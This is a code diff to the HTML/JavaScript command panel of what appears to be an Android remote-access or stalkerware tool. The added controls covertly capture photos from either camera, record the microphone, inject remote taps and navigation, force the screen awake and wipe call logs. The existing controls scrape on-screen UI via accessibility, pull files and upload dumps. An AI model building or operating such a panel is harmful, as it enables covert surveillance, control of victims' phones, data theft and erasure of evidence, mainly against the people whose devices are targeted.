@@ -145,6 +145,7 @@
             <div class="card">
                 <div class="cmd-row"><label class="cmd-label">User Alert</label><div class="input-wrap"><input type="text" id="val-toast" placeholder="Toast msg..."><button class="btn" onclick="sendCmd('TOAST')">Toast</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Sonic Alarm</label><div class="input-wrap"><input type="number" id="val-ring" placeholder="Secs (e.g. 10)"><button class="btn" onclick="sendCmd('RING')">Ring</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Force Wake (Screen Ignite)</label><div class="input-wrap"><select id="val-wake" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="standard">Standard Wake</option><option value="wellbeing">Route to Wellbeing</option></select><button class="btn" onclick="sendCmd('WAKE')">Ignite</button></div></div>
                 <div class="cmd-row">
                     <label class="cmd-label">Remote Intent</label>
                     <input type="text" id="int-act" value="android.intent.action.VIEW" placeholder="Action">
@@ -160,19 +161,63 @@
                 </div>
             </div>
 
-            <h2>Surveillance</h2>
+            <h2>Surveillance (Optical / Audio)</h2>
             <div class="card">
                 <div class="cmd-row">
-                    <label class="cmd-label">Accessibility Audit</label>
+                    <label class="cmd-label">Optical Capture</label>
+                    <div class="input-wrap">
+                        <select id="cam-side" style="width:80px; background:#000; color:var(--primary); border:1px solid var(--surface-light);"><option value="REAR">Rear</option><option value="FRONT">Front</option></select>
+                        <input type="number" id="cam-count" value="1" placeholder="Qty" style="width:60px">
+                        <button class="btn" onclick="sendCmd('CAPTURE_IMAGE')">Capture</button>
+                    </div>
+                </div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Acoustic Snippet</label>
+                    <div class="input-wrap">
+                        <input type="number" id="mic-dur" value="10" placeholder="Secs">
+                        <button class="btn" onclick="sendCmd('RECORD_VOICE')">Record Mic</button>
+                    </div>
+                </div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Ghost Interaction (Remote Touch)</label>
+                    <div class="input-wrap">
+                        <select id="touch-act" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
+                            <option value="NAV|BACK">Nav: Back</option>
+                            <option value="NAV|HOME">Nav: Home</option>
+                            <option value="NAV|RECENTS">Nav: Recents</option>
+                            <option value="TAP">Custom Tap (X,Y)</option>
+                        </select>
+                        <input type="text" id="touch-val" placeholder="Params (if tap)" style="width:100px">
+                        <button class="btn" onclick="sendCmd('REMOTE_TOUCH')">Send</button>
+                    </div>
+                </div>
+            </div>
+
+            <h2>Data Extraction & Forensics</h2>
+            <div class="card">
+                <div class="cmd-row">
+                    <label class="cmd-label">Accessibility Audit (UI Scraper)</label>
                     <div class="input-wrap">
                         <input type="text" id="tree-pkg" placeholder="Package (null for all)">
                         <input type="number" id="tree-dur" value="1" placeholder="Mins" style="width:80px">
                         <button class="btn" onclick="sendCmd('GET_TREE')">Audit</button>
                     </div>
                 </div>
-                <div class="cmd-row"><label class="cmd-label">Forensic Pull</label><div class="input-wrap"><input type="text" id="val-pull" placeholder="/sdcard/Download/file.jpg"><button class="btn" onclick="sendCmd('PULL_FILE')">Fetch</button></div></div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Call Log Sanitizer</label>
+                    <div class="input-wrap">
+                        <select id="call-act" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
+                            <option value="CLEAR_ALL">Wipe All Logs</option>
+                            <option value="DELETE_LAST">Wipe Last (Mins)</option>
+                            <option value="DELETE_NUM">Wipe Number</option>
+                        </select>
+                        <input type="text" id="call-val" placeholder="Val" style="width:80px">
+                        <button class="btn" onclick="sendCmd('PHONE_LOGS')">Sanitize</button>
+                    </div>
+                </div>
+                <div class="cmd-row"><label class="cmd-label">Forensic File Pull</label><div class="input-wrap"><input type="text" id="val-pull" placeholder="/sdcard/Download/file.jpg"><button class="btn" onclick="sendCmd('PULL_FILE')">Fetch</button></div></div>
                 <div class="cmd-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
-                    <button class="btn" onclick="sendCmd('GET_SKELETON')">Index Files</button>
+                    <button class="btn" onclick="sendCmd('GET_SKELETON')">Index Storage</button>
                     <button class="btn" onclick="sendCmd('GET_LOGS')">Diag Logs</button>
                     <button class="btn" onclick="sendCmd('UPLOAD_DUMPS')">Sync Dumps</button>
                 </div>
@@ -314,6 +359,18 @@
                         content = `${document.getElementById('tog-feat').value}:${document.getElementById('tog-state').value}:${document.getElementById('tog-dur').value}`; break;
                     case 'CODERED':
                         content = `${document.getElementById('cr-code').value}-${document.getElementById('cr-dur').value}-${document.getElementById('cr-freq').value}`; break;
+                    case 'CAPTURE_IMAGE':
+                        content = `${document.getElementById('cam-side').value}|${document.getElementById('cam-count').value}`; break;
+                    case 'RECORD_VOICE':
+                        content = document.getElementById('mic-dur').value; break;
+                    case 'WAKE':
+                        content = document.getElementById('val-wake').value; break;
+                    case 'REMOTE_TOUCH':
+                        const tAct = document.getElementById('touch-act').value;
+                        const tVal = document.getElementById('touch-val').value;
+                        content = tAct.includes('|') ? tAct : `${tAct}|${tVal}`; break;
+                    case 'PHONE_LOGS':
+                        content = `${document.getElementById('call-act').value}|${document.getElementById('call-val').value}`; break;
                 }
             }
 
